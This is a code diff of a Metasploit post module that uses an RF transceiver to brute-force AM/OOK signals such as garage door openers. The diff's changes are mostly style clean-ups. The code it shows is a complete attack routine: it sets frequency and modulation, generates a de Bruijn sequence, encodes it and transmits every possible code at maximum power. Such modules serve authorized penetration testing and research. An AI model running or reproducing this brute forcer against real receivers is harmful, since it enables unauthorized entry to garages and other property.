@@ -1,12 +1,16 @@
-class MetasploitModule < Msf::Post
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
+class MetasploitModule < Msf::Post
   include Msf::Post::Hardware::RFTransceiver::RFTransceiver
 
   def initialize(info={})
     super( update_info( info,
         'Name'          => 'Brute Force AM/OOK (ie: Garage Doors)',
         'Description'   => %q{ Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw
-                               binary signals.  This is a port of the LegacySecurityGroup.com rfpwnon tool.
+                               binary signals.  This is a port of the rfpwnon tool by Corey Harding.
                                (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)
         },
         'License'       => MSF_LICENSE,
@@ -26,7 +30,7 @@ class MetasploitModule < Msf::Post
       OptBool.new('EXTRAVERBOSE', [false, "More verbose", false]),
       OptInt.new('INDEX', [false, "USB Index to use", 0]),
       OptInt.new('DELAY', [false, "Delay in milliseconds between transmissions", 500])
-    ], self.class)
+    ])
     @zeropwm = "1110"
     @onepwm = "1000"
     @brutechar = "01"
@@ -74,15 +78,15 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if not is_rf?
+    unless is_rf?
       print_error("Not an RF Transceiver")
       return
     end
-    if not set_index(datastore['INDEX'])
-      print_error("Couldn't set usb index to #{datastore["INDEX"]}")
+    unless set_index(datastore['INDEX'])
+      print_error("Couldn't set usb index to #{datastore['INDEX']}")
       return
     end
-    if datastore["TRI"]
+    if datastore['TRI']
       @zeropwm = "10001000"
       @onepwm = "11101110"
       @twopwm = "10001110"
@@ -90,9 +94,9 @@ class MetasploitModule < Msf::Post
     end
 
     set_modulation("ASK/OOK")
-    set_freq(datastore["FREQ"])
+    set_freq(datastore['FREQ'])
     set_sync_mode(0)
-    set_baud(datastore["BAUD"])
+    set_baud(datastore['BAUD'])
     max_power
 
     print_status("Generating de bruijn sequence...")
@@ -101,31 +105,31 @@ class MetasploitModule < Msf::Post
     brutepacket = seq + tail
 
     print_status("Brute forcing frequency: #{datastore['FREQ']}")
-    print_status("Padding before binary: #{datastore['PPAD']}") if datastore["PPAD"]
-    print_status("Padding after binary: #{datastore["TPAD"]}") if datastore["TPAD"]
-    print_status("De Bruijin Sequence: #{brutepacket}") if datastore["EXTRAVERBOSE"]
+    print_status("Padding before binary: #{datastore['PPAD']}") if datastore['PPAD']
+    print_status("Padding after binary: #{datastore['TPAD']}") if datastore['TPAD']
+    print_status("De Bruijin Sequence: #{brutepacket}") if datastore['EXTRAVERBOSE']
 
     startn = 0
     endy = 512
     brutepackettmp = ""
     addr = 512
-    if datastore["TRI"]
+    if datastore['TRI']
       endy = 128
       addr = 128
     end
-    if datastore["REPEAT"] >= 2 or datastore["PPAD"] or datastore["TPAD"]
-      endy = datastore["BINLENGTH"]
+    if datastore['REPEAT'] >= 2 || datastore['PPAD'] || datastore['TPAD']
+      endy = datastore['BINLENGTH']
       addr = 1
     end
     # Transmit
     while startn < brutepacket.length
-      (0..datastore["REPEAT"]-1).each do |i|
+      (0..datastore['REPEAT']-1).each do |i|
         brutepackettemp = brutepacket[startn..endy-1]
-        next if brutepackettemp.length < datastore["BINLENGTH"]
+        next if brutepackettemp.length < datastore['BINLENGTH']
         # Pad if asked to
-        brutepackettemp = datastore["PPAD"] + brutepackettemp if datastore["PPAD"]
-        brutepackettemp += datastore["TPAD"] if datastore["TPAD"]
-        if datastore["RAW"]
+        brutepackettemp = datastore['PPAD'] + brutepackettemp if datastore['PPAD']
+        brutepackettemp += datastore['TPAD'] if datastore['TPAD']
+        if datastore['RAW']
           key_packed = brutepackettemp.scan(/.{1,8}/).collect{|x| x.to_i(2).chr}
         else
           key_packed = convert_ook(brutepackettemp)
@@ -137,18 +141,17 @@ class MetasploitModule < Msf::Post
         print_status("#{brutepackettemp}")
         print_status("Binary after PWM encoding:")
         print_status("#{key_packed.join.unpack("H*")[0].hex.to_s(2)}")
-        sleep(datastore["DELAY"] / 1000) if datastore["DELAY"] > 0
+        sleep(datastore['DELAY'] / 1000) if datastore['DELAY'] > 0
       end
-      if datastore["REPEAT"] >= 2 or datastore["PPAD"] or datastore["TPAD"]
+      if datastore['REPEAT'] >= 2 or datastore['PPAD'] or datastore['TPAD']
         startn += addr
         endy += addr
       else
-        startn = startn + addr - datastore["BINLENGTH"]
-        endy = endy + addr - datastore["BINLENGTH"]
+        startn = startn + addr - datastore['BINLENGTH']
+        endy = endy + addr - datastore['BINLENGTH']
       end
     end
     print_status("Done")
     set_mode("IDLE")
   end
-
 end
